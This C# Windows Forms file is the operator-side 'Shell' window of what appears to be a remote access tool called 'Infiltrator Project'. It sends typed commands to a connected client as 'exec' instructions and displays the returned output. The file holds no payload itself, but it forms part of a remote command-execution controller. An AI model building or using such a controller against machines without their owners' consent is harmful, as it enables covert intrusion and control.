using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Conexion;


namespace Server
{
    public partial class Shell : Form
    {
        public static Shell Instance { get; private set; }
        private TcpClient _cliente;
        private int _idCliente;
        public Shell(int id, TcpClient cliente)
        {
            InitializeComponent();
            Instance = this;
            _cliente = cliente;
            _idCliente = id;
            this.Text = $"Shell Remota - Cliente {_idCliente}";
        }

        private void Shell_Load(object sender, EventArgs e)
        {
            richTextBox1.AppendText("Infiltrator Project [Versión 1.0]\n");
            richTextBox1.AppendText($"Conectado al cliente {_idCliente}.\n");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string command = textBox1.Text.Trim();

            if (!string.IsNullOrEmpty(command)) {

                ServerSocket.setWaiting(true);
                ServerSocket.SendCommand(_idCliente, "exec "+command);
                richTextBox1.AppendText("Infiltrator user > " + command + "\n");
                textBox1.Clear();

            }
        }

        public void AppendCommandOutput(string output)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(AppendCommandOutput), output);
                return;
            }

            richTextBox1.AppendText(output + Environment.NewLine);
        }
    }
}
